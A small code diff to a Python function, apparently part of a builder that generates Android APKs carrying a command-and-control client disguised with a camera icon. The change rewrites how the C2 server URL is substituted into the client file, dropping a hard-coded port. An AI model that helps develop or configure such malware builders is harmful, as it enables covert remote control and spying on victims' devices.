@@ -64,8 +64,9 @@ def generate_apk(apk_name, c2_url, icon_type='camera'):
         with open(c2_client_file, 'r') as f:
             content = f.read()
 
-        content = content.replace('http://10.0.0.1:5000', c2_url)
-        content = content.replace('ws://10.0.0.1:5000', c2_url)
+        # Ajustado para porta 80 — URL sem porta
+        content = content.replace('http://10.0.0.1', c2_url)
+        content = content.replace('ws://10.0.0.1', c2_url)
 
         with open(c2_client_file, 'w') as f:
             f.write(content)
